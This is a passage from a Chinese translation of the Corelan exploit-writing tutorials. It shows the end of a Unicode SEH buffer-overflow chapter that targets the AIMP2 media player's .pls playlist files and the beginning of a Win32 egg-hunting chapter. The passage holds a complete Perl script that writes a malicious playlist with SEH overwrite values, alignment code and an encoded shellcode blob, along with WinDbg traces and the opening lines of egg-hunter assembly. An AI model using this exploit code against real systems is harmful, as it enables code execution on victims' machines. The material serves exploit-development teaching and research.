0012fdb8 0500020011 add eax,offset bass+0x200 (11000200)
0:000>
eax=1112ffa0 ebx=00000000 ecx=7c9032a9 edx=7c9032bc esi=00000000 edi=00000000
eip=0012fdbd esp=0012d8f0 ebp=0012d9c0 iopl=0 nv up ei pl nz na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200206
+0x12fdac:
0012fdbd 006d00 add byte ptr [ebp],ch ss:0023:0012d9c0=ff
0:000>
eax=1112ffa0 ebx=00000000 ecx=7c9032a9 edx=7c9032bc esi=00000000 edi=00000000
eip=0012fdc0 esp=0012d8f0 ebp=0012d9c0 iopl=0 nv up ei pl nz ac po cy
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200213
+0x12fdaf:
0012fdc0 2d00010011 sub eax,offset bass+0x100 (11000100)
0:000>
eax=0012fea0 ebx=00000000 ecx=7c9032a9 edx=7c9032bc esi=00000000 edi=00000000
eip=0012fdc5 esp=0012d8f0 ebp=0012d9c0 iopl=0 nv up ei pl nz na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200206
+0x12fdb4:
0012fdc5 006d00 add byte ptr [ebp],ch ss:0023:0012d9c0=31
0:000> d eax
0012fea0 42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00 B.B.B.B.B.B.B.B.
0012feb0 42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00 B.B.B.B.B.B.B.B.
0012fec0 42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00 B.B.B.B.B.B.B.B.
0012fed0 42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00 B.B.B.B.B.B.B.B.
0012fee0 42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00 B.B.B.B.B.B.B.B.
0012fef0 42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00 B.B.B.B.B.B.B.B.
0012ff00 42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00 B.B.B.B.B.B.B.B.
0012ff10 42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00 B.B.B.B.B.B.B.B.
0:000> t
eax=0012fea0 ebx=00000000 ecx=7c9032a9 edx=7c9032bc esi=00000000 edi=00000000
eip=0012fdc8 esp=0012d8f0 ebp=0012d9c0 iopl=0 nv up ei pl nz na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200206
+0x12fdb7:
0012fdc8 50 push eax
0:000> t
eax=0012fea0 ebx=00000000 ecx=7c9032a9 edx=7c9032bc esi=00000000 edi=00000000
eip=0012fdc9 esp=0012d8ec ebp=0012d9c0 iopl=0 nv up ei pl nz na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200206
+0x12fdb8:
0012fdc9 006d00 add byte ptr [ebp],ch ss:0023:0012d9c0=63
0:000> t
eax=0012fea0 ebx=00000000 ecx=7c9032a9 edx=7c9032bc esi=00000000 edi=00000000
eip=0012fdcc esp=0012d8ec ebp=0012d9c0 iopl=0 ov up ei ng nz na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200a86
+0x12fdbb:
0012fdcc c3 ret
0:000> t
eax=0012fea0 ebx=00000000 ecx=7c9032a9 edx=7c9032bc esi=00000000 edi=00000000
eip=0012fea0 esp=0012d8f0 ebp=0012d9c0 iopl=0 ov up ei ng nz na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200a86
+0x12fe8f:
0012fea0 42 inc edx
现在eax已经指向了我们的B’s，并成功实现跳转。我们只需将shellcode放置在0x0012fea0即可，同时在跳转
指令与shellcode入口之间添加一些垃圾指令。经过计算，可以知道我们需要填充105字节。代码如下：
my $header = "[playlist]\nNumberOfEntries=1\n\n";
$header=$header."File1=";
my $junk="A" x 4065;
my $seh="\x41\x6d"; # inc ecx + add byte ptr [ebp],ch
my $nseh="\x0e\x45"; #0045000E aimp2.dll
#good stuff on the stack, we need 4th address
my $align = "\x58"; #pop eax
$align=$align."\x6d";
$align=$align."\x58"; #pop eax
$align=$align."\x6d";
$align=$align."\x58"; #pop eax
$align=$align."\x6d";
$align=$align."\x58"; #pop eax
$align=$align."\x6d";
#now increase the address in eax so it would point to our buffer
$align = $align."\x05\x02\x11"; #add eax,11000200
$align=$align."\x6d"; #align/nop
$align=$align."\x2d\x01\x11"; #sub eax,11000100
$align=$align."\x6d"; #align/nop
#jump to eax now
my $jump = "\x50"; #push eax
$jump=$jump."\x6d"; #nop/align
$jump=$jump."\xc3"; #ret
#add some padding
my $padding="C" x 105;
#eax points at shellcode
my $shellcode="PPYAIAIAIAIAQATAXAZAPA3QADAZABARA".
"LAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZA".
"BABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JB".
"KLK8U9M0M0KPS0U99UNQ8RS44KPR004K22LLDKR2MD4KCBMX".
"LOGG0JO6NQKOP1WPVLOLQQCLM2NLMPGQ8OLMM197K2ZP22B7".
"TK0RLPTK12OLM1Z04KOPBX55Y0D4OZKQXP0P4KOXMHTKR8MP".
"KQJ3ISOL19TKNTTKM18VNQKONQ90FLGQ8OLMKQY7NXK0T5L4".
"M33MKHOKSMND45JBR84K0XMTKQHSBFTKLL0KTK28MLM18S4K".
"KT4KKQXPSYOTNDMTQKQK311IQJPQKOYPQHQOPZTKLRZKSVQM".
"2JKQTMSU89KPKPKP0PQX014K2O4GKOHU7KIPMMNJLJQXEVDU".
"7MEMKOHUOLKVCLLJSPKKIPT5LEGKQ7N33BRO1ZKP23KOYERC".
"QQ2LRCM0LJA";
#more stuff
my $rest="B" x 1000;
my $payload=$header.$junk.$seh.$nseh.$align.$jump.$padding.$shellcode.$rest."\n";
open(myfile,'>aimp2sploit.pls');
print myfile $payload;
print "Wrote " . length($payload)." bytes\n";
close(myfile);
结果（使用断点来查看跳转到eax前寄存器eax的情况）：
0:000> d eax
0012fea0 50 00 50 00 59 00 41 00-49 00 41 00 49 00 41 00 P.P.Y.A.I.A.I.A.
0012feb0 49 00 41 00 49 00 41 00-51 00 41 00 54 00 41 00 I.A.I.A.Q.A.T.A.
0012fec0 58 00 41 00 5a 00 41 00-50 00 41 00 33 00 51 00 X.A.Z.A.P.A.3.Q.
0012fed0 41 00 44 00 41 00 5a 00-41 00 42 00 41 00 52 00 A.D.A.Z.A.B.A.R.
0012fee0 41 00 4c 00 41 00 59 00-41 00 49 00 41 00 51 00 A.L.A.Y.A.I.A.Q.
0012fef0 41 00 49 00 41 00 51 00-41 00 50 00 41 00 35 00 A.I.A.Q.A.P.A.5.
0012ff00 41 00 41 00 41 00 50 00-41 00 5a 00 31 00 41 00 A.A.A.P.A.Z.1.A.
0012ff10 49 00 31 00 41 00 49 00-41 00 49 00 41 00 4a 00 I.1.A.I.A.I.A.J.
0:000> d
0012ff20 31 00 31 00 41 00 49 00-41 00 49 00 41 00 58 00 1.1.A.I.A.I.A.X.
0012ff30 41 00 35 00 38 00 41 00-41 00 50 00 41 00 5a 00 A.5.8.A.A.P.A.Z.
0012ff40 41 00 42 00 41 00 42 00-51 00 49 00 31 00 41 00 A.B.A.B.Q.I.1.A.
0012ff50 49 00 51 00 49 00 41 00-49 00 51 00 49 00 31 00 I.Q.I.A.I.Q.I.1.
0012ff60 31 00 31 00 31 00 41 00-49 00 41 00 4a 00 51 00 1.1.1.A.I.A.J.Q.
0012ff70 49 00 31 00 41 00 59 00-41 00 5a 00 42 00 41 00 I.1.A.Y.A.Z.B.A.
0012ff80 42 00 41 00 42 00 41 00-42 00 41 00 42 00 33 00 B.A.B.A.B.A.B.3.
0012ff90 30 00 41 00 50 00 42 00-39 00 34 00 34 00 4a 00 0.A.P.B.9.4.4.J.
0:000> d
0012ffa0 42 00 4b 00 4c 00 4b 00-38 00 55 00 39 00 4d 00 B.K.L.K.8.U.9.M.
0012ffb0 30 00 4d 00 30 00 4b 00-50 00 53 00 30 00 55 00 0.M.0.K.P.S.0.U.
0012ffc0 39 00 39 00 55 00 4e 00-51 00 38 00 52 00 53 00 9.9.U.N.Q.8.R.S.
0012ffd0 34 00 34 00 4b 00 50 00-52 00 30 00 30 00 34 00 4.4.K.P.R.0.0.4.
0012ffe0 4b 00 32 00 32 00 4c 00-4c 00 44 00 4b 00 52 00 K.2.2.L.L.D.K.R.
0012fff0 32 00 4d 00 44 00 34 00-4b 00 43 00 42 00 4d 00 2.M.D.4.K.C.B.M.
00130000 41 63 74 78 20 00 00 00-01 00 00 00 9c 24 00 00 Actx ........$..
00130010 c4 00 00 00 00 00 00 00-20 00 00 00 00 00 00 00 ........ .......
这是否成功了呢？仔细看下……冒似我们的 shellcode 太大了，超过 00130000 的字节都被截断了。因此我们不
能在SEH结构之后放置shellcode。
我可以继续完成这个教程，并解释如何完成这份exploit，但我并不打算这样做。相信读者可以使用自己的创造
力，编写出自己可用的exploit出来。有任何问题可到论坛上询问，我会尽量帮你解决所有问题（当然并不会直
接给出正确答案）。
过后我会把答案发在博客上。
Thanks to
- D-Null and Edi Strosar, for supporting me throughout the process of writing this tutorial
- D-Null, Edi Strosar, CTF Ninja, FX for proof-reading this tutorial… Your comments & feedback
were a big help & really valuable to me !
Finally
If you build your own exploits - don't forget to send your greetz to me (corelanc0d3r) :-)
This entry was posted on Friday, November 6th, 2009 at 12:02 pm and is filed under Exploits,
Security You can follow any responses to this entry through the Comments (RSS) feed. You can
leave a response, or trackback from your own site.
Win32 Egg Hunting
秋风寒 一朵雪花
20010704 译
首发于看雪论坛
前言
距离复活节还有一段时间，不过现在也许正是探讨寻找彩蛋方式的好时机（我们正好可以为复活节女郎给我们
带来的下一个0Day 漏洞做好准备）。
这套编写exploit指南系列的开头部分，已经讲述了如何利用栈溢出来执行我们的代码的方法。过去我们编写的
所有exploit中，保存shellcode代码的地址要不是静态的（至少差不多是），要不就是保存在某个寄存器中，所以这
个地址是稳定的和可靠的。
接下来的部分讲述了各种各样跳转到shellcode的技术，这其中还包括了那些需要利用一个甚至几个跳板才能找
到shellcode的复杂技术。在这些示例例子中，栈上的有效内存空间总是足以保存整个shellcode代码。
那么如果可用的内存放不下整个 Shellcode 代码怎么办呢？这时我们就要用到一种被称之为寻找复活节彩蛋
（egg hunting）的技术（下文起我们将简称”寻蛋”）。寻蛋技术是”Staged shellcode”技术的一种。寻蛋是利用一小段
代码来在内存中寻找真正的(代码尺寸较大的)shellcode(the “egg”)的技术。换句话说就是：首先一小段代码被执行，
然后找到真正的shellcode并执行。
使用这项技术需要三个前置条件：
1. 必须能够跳转(jmp, call, push/ret)并执行一些shellcode。这时有效的缓冲区内存可以相对小一些，以为这
时只需要保存那些寻蛋代码（egg hunter）。寻蛋代码必须被放置在预先设定的位置，这样才能控制代码
可靠的跳转到寻蛋代码并执行寻蛋代码。
2. 最终要执行的shellcode必须在内存的某个位置（堆、栈等）存在。
3. 必须自爱最终要执行的shellcode的前面放置唯一的标识。最初执行的shellcode（即寻蛋代码）将逐字节
的搜寻内存来寻找这个标识。找到后就通过jmp或call指令来开始执行跟在标识后的代码。这就意味着
首先必须在寻蛋代码中定义这个标识，然后并把这个标识写在实际的shellcode前面。
搜寻内存需要花费相当多的处理器时间并且可能要持续一段时间，所以使用寻蛋代码时，我们会遇到以下
问题：
 一段时间内（当搜索内存时）cpu被完全占用。
 经历很长一段时间后，shellcode才能开始执行（想象我们有3G的内存可以搜索）。
历史渊源和技术基础
关于这个专题，目前仅有少量文献面世：其中最好的论文是Skape很久以前写的；你可以在这里找到些关于仅
在堆上进行搜索的寻蛋技术的材料。
Skape 的论文是目前互联网上能找到的最好的关于寻蛋技术的参考资料。该论文包含了许多具体的技术和运行
在window和linux的例子，并且清楚明了的解释了寻蛋技术如何工作和安全的搜索内存的方法。
这里我将不再重复寻蛋技术背后的技术细节，因为Skape的论文已经详细的介绍了。这里我将用几个例子来展
示如何在栈溢出时使用这项技术。
有几点你需要牢记：
 用到的标识需要是唯一的(通常你需要在寻蛋代码中用4个字节来定义标识，然后把两个连续的标识（8个字节）
放在真正的shellcode前面)。
 对 于 一 个 特 定 的 exploit ， 必 须 测 试 哪 个 内 存 搜 索 技 术 可 以 工 作 。（ 在 我 得 系 统 上
NTAccessCheckAndAuditAlarm工作的最好）。
 不同的技术需要不同大笑的存储空间来存储寻蛋代码：
利于SHE的寻蛋方法需要大约60个字节，利用IsBadReadPtr的寻蛋方法需要37个字节，利用NtDisplayString
的寻蛋方法需要32字节。（最后一种只能工作在NT核心的系统，其两种在win9x也能很好的工作）。
寻蛋代码（Egg hunter code）
如前文提到的那样，Skape已经略述了3种基于window平台的exploit的寻蛋技术。同样，我这里将不打算介
绍这些寻蛋技术背后的原理，相反，我将给大家提供一些实现一个寻蛋方案需要的代码。
具体采用那种寻蛋方案主要取决于以下考虑：
 运行寻蛋代码所需要的缓冲区大小.
 你需要测试选用的搜索内存的技术是否能在你的机器上和你要利用的exploit上正常工作。
利用 SEH 的寻蛋算法
寻蛋代码占用60个字节，蛋代码占用8个字节（即两个标记的长度）。
EB21 jmp short 0x23
59 pop ecx
B890509050 mov eax,0x50905090 ; this is the tag